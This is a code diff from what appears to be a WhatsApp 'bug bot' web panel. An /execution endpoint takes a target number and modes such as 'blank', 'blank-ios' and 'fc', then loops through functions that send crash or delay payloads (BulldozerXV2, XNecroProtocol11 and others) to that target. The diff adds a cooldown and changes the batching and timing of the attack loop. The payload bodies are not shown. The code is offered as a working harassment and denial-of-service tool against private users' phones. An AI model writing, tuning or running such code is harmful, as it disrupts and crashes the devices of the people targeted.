@@ -1252,7 +1252,7 @@ app.get("/execution", (req, res) => {
 
       // 🔥 CEK COOLDOWN GLOBAL
       const now = Date.now();
-      const cooldown = 0 * 0 * 0; // 5 menit
+      const cooldown = 15 * 60 * 1000; // 15 menit
       if (now - lastExecution < cooldown) {
         const sisa = Math.ceil((cooldown - (now - lastExecution)) / 1000);
         return res.send(executionPage("⏳ SERVER COOLDOWN", {
@@ -1297,15 +1297,15 @@ app.get("/execution", (req, res) => {
 
       try {
         if (mode === "delay") {
-          invis(24, target);
+          Invisibdelay(1, target);
         } else if (mode === "invis") {
-          invis(24, target);
+          Invisibdelay(1, target);
         } else if (mode === "blank") {
-          invis(24, target);
+          Invisibdelay(1, target);
         } else if (mode === "blank-ios") {
-          invis(24, target);
+          Invisibdelay(1, target);
         } else if (mode === "fc") {
-          invis(24, target);
+          Invisibdelay(1, target);
         } else {
           throw new Error("Mode tidak dikenal.");
         }
@@ -2323,53 +2323,61 @@ async function XtravsBetaXx(target, mention) {
   }
 }
 
-async function invis(durationHours, X) {
-  const totalDurationMs = durationHours * 3600000;
+
+async function Delayinvisdrayy(target) {
+for (let i = 0; i < 1; i++) {
+await BulldozerXV2(target, false)
+await DelayPayNew(target)
+await BetaHardDelay(sock, target)
+await XNecroProtocol11(target, false)
+await BulldoHard(Mvaa, target)
+await XtravsBetaXxV2(target, false)
+await XtravsBetaXx(target, false)
+await sleep(500);
+console.log(chalk.green(`[  ☇ 𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐒𝐞𝐧𝐝 𝟔 𝐁𝐮𝐠  ]`));
+    }
+}
+
+async function Invisibdelay(durationHours, target) {
+  const totalDurationMs = durationHours * 60 * 1000;
   const startTime = Date.now();
   let count = 0;
-  let batch = 1;
-  const maxBatches = 5;
 
   const sendNext = async () => {
-    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
-      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
+    if (Date.now() - startTime >= totalDurationMs) {
+      console.log(`Stopped after sending ${count} messages`);
       return;
     }
 
     try {
-      if (count < 35) {
-        await Promise.all([
-        BulldozerXV2(target, false),
-        DelayPayNew(target),
-        BetaHardDelay(sock, target),
-        XNecroProtocol11(target, false),
-        XtravsBetaXxV2(target, false),
-        XtravsBetaXx(target, false),
-        await sleep(500)
-        ]);
-        console.log(chalk.yellow(`
-┌────────────────────────┐
-│ ${count + 1}/400 INVISIBLE 🕊️
-└────────────────────────┘
-  `));
+      if (count < 20) {
+        Delayinvisdrayy(target)
+        sleep(100)
+        console.log(
+          chalk.red(`
+[  ☇ 𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠  ]
+┌─────────────────────────╸╴
+│ ᯓ Target : ${target}
+│ ᯓ Total Bugs : 1000
+│ ᯓ Total Bugs Terkirim : ${count}
+│ ᯓ Type Bugs : Delay Invisible
+└─────────────────────────╸╴`)
+        );
         count++;
-        setTimeout(sendNext, 700);
+        setTimeout(sendNext, 10000);
       } else {
-        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
-        if (batch < maxBatches) {
-          console.log(chalk.yellow(`( Grade VORTUNIX 🍂 777 ).`));
-          count = 0;
-          batch++;
-          setTimeout(sendNext, 300000);
-        } else {
-          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
-        }
+        console.log(chalk.green(`[  ☇ 𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠  ]`));
+        count = 0;
+        console.log(chalk.red("[  ☇ 𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠  ]"));
+        setTimeout(sendNext, 10000);
       }
     } catch (error) {
-      console.error(`✗ Error saat mengirim: ${error.message}`);
-      setTimeout(sendNext, 700);
+      console.error(`❌ Error saat mengirim: ${error.message}`);
+
+      setTimeout(sendNext, 10);
     }
   };
+
   sendNext();
 }
 
